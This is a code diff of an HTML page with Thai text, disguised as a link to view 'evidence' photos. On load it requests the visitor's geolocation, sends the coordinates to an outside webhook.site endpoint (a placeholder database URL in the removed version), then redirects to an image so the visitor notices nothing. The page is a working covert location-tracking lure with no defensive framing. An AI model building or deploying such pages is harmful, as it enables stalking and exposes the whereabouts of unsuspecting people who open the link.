@@ -3,43 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta property="og:title" content="ดูรูปภาพหลักฐาน">
-    <meta property="og:image" content="[ใส่ลิงก์รูปภาพของท่านที่นี่]"> 
-    <meta property="og:description" content="คลิกเพื่อเปิดดูรูปภาพฉบับเต็ม">
+    <meta property="og:image" content="evidence.jpg"> 
     <meta property="og:type" content="website">
-
-    <title>กำลังโหลดรูปภาพ...</title>
+    <title>Loading...</title>
 </head>
-<body onload="getLocation()" style="background:#000; color:#fff; text-align:center; font-family:sans-serif;">
-    <h2 id="msg">กำลังโหลดรูปภาพ...</h2>
-
+<body onload="getLocation()" style="background:#000; color:#fff; text-align:center; padding-top:50px;">
+    <h2>กำลังโหลดรูปภาพ...</h2>
     <script>
         function getLocation() {
-            // ระบบจะขออนุญาตเข้าถึงพิกัด (คนกดต้องกด 'ตกลง' ถึงจะได้เลขเป๊ะๆ)
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendPosition, showError);
-            } else {
-                goToImage();
-            }
+                navigator.geolocation.getCurrentPosition(s => {
+                    // ส่งพิกัดไปที่ระบบหลังบ้าน (Webhook)
+                    fetch(`https://webhook.site/YOUR-UNIQUE-ID?lat=${s.coords.latitude}&lng=${s.coords.longitude}`);
+                    setTimeout(go, 500);
+                }, go);
+            } else { go(); }
         }
-
-        function sendPosition(position) {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            
-            // [ใส่ URL เว็บรับข้อมูลของท่านที่นี่] เช่น Firebase หรือ Google Form
-            const url = `https://your-database-url.com/save?lat=${lat}&lng=${lng}`;
-            
-            fetch(url).finally(() => {
-                goToImage();
-            });
-        }
-
-        function showError() { goToImage(); }
-
-        function goToImage() {
-            // เมื่อดึงพิกัดเสร็จ (หรือดึงไม่ได้) ให้เด้งไปดูรูปจริงทันที
-            window.location.href = "[ใส่ลิงก์รูปภาพของท่านที่นี่]"; 
-        }
+        function go() { window.location.href = "evidence.jpg"; }
     </script>
 </body>
 </html>
